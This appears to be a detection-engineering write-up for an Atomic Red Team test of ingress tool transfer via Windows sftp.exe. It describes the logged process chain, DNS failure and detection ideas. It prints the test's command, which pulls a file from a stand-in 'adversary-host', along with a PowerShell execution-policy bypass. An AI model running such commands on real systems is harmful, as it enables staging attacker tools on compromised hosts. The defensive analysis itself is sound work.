# T1105-37: Ingress Tool Transfer — Windows pull file using sftp.exe

## Technique Context

T1105 Ingress Tool Transfer involves adversaries transferring tools or files from an external system into a compromised environment. The SFTP (SSH File Transfer Protocol) method demonstrated here represents a common technique where attackers leverage legitimate file transfer utilities already present on Windows systems. Since Windows 10 version 1809, Microsoft includes OpenSSH client tools by default, making `sftp.exe` a readily available Living off the Land Binary (LOLBin) for file transfers.

Detection engineers focus on monitoring file transfer utilities for suspicious usage patterns, unexpected network connections, transfers of executable files, and command-line arguments that indicate external file retrieval. The technique is particularly concerning because it uses legitimate Windows functionality, making it harder to distinguish from normal administrative activity.

## What This Dataset Contains

This dataset captures a PowerShell-executed SFTP file transfer operation with comprehensive telemetry across multiple log sources:

**Process Chain (Security 4688 events):**
- Parent PowerShell process (PID 13020): `powershell.exe`
- Child PowerShell process (PID 12328): `"powershell.exe" & {sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp}`
- SFTP process (PID 13380): `"C:\Windows\System32\OpenSSH\sftp.exe" adversary@adversary-host:/tmp/T1105.txt C:\temp`
- SSH subprocess (PID 13676): `"C:\Windows\System32\OpenSSH\ssh.exe" "-oForwardX11 no" "-oPermitLocalCommand no" "-oClearAllForwardings yes" "-oForwardAgent no" -l adversary -s -- adversary-host sftp`

**PowerShell Evidence (4104 events):**
- Script block showing the actual command: `& {sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp}`
- Execution policy bypass: `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass`

**Sysmon Process Creation (EID 1):**
- SFTP creation with full command line captured
- Process GUID tracking enabling correlation across events

**Network Activity (Sysmon EID 22):**
- DNS query for "adversary-host" (QueryStatus: 9003 indicating failure)

**Process Termination:**
- Both SSH and SFTP processes exit with status 0xFF (255), indicating connection failure
- PowerShell processes exit cleanly with status 0x0

## What This Dataset Does Not Contain

The SFTP transfer attempt failed due to the non-existent target host "adversary-host", so the dataset lacks:
- Successful network connection events (Sysmon EID 3)
- Actual file transfer operations
- File creation events showing downloaded content
- Authentication-related events that would occur with a real SFTP server

The Sysmon configuration's include-mode filtering means some expected process creation events are missing - specifically, the parent PowerShell process creation isn't captured because it doesn't match the suspicious patterns in the sysmon-modular config. However, Security event 4688 provides complete process creation coverage with command-line logging.

## Assessment

This dataset provides excellent detection opportunities despite the failed connection. The Security and PowerShell logs capture the complete attack chain with full command-line visibility, while Sysmon adds valuable process relationship data and DNS query information. The failure scenario actually adds detection value by showing the telemetry patterns when adversaries attempt file transfers to unreachable infrastructure.

The combination of PowerShell script block logging, Security process auditing, and Sysmon process tracking creates multiple detection layers. Detection engineers can build robust rules around the SFTP command patterns, process relationships, and PowerShell execution context without requiring successful network connections.

## Detection Opportunities Present in This Data

1. **SFTP Command Line Pattern Detection** - Monitor Security 4688 events for `sftp.exe` with remote host arguments (pattern: `sftp.exe user@host:/path destination`)

2. **PowerShell Script Block Analysis** - Detect PowerShell 4104 events containing SFTP execution patterns, particularly when combined with execution policy bypass

3. **Process Chain Analysis** - Correlate PowerShell parent processes spawning OpenSSH tools (sftp.exe, ssh.exe) using process GUIDs across Security and Sysmon logs

4. **DNS Query Correlation** - Monitor Sysmon EID 22 DNS queries to external hosts preceded by SFTP process creation attempts

5. **Failed Connection Detection** - Track SSH/SFTP processes with exit codes 0xFF as potential IOCs for infrastructure discovery or failed C2 connections

6. **Living off the Land Detection** - Alert on OpenSSH client tool execution from non-standard parent processes or with external host arguments

7. **PowerShell Execution Context** - Detect execution policy bypass combined with external file transfer commands in the same PowerShell session
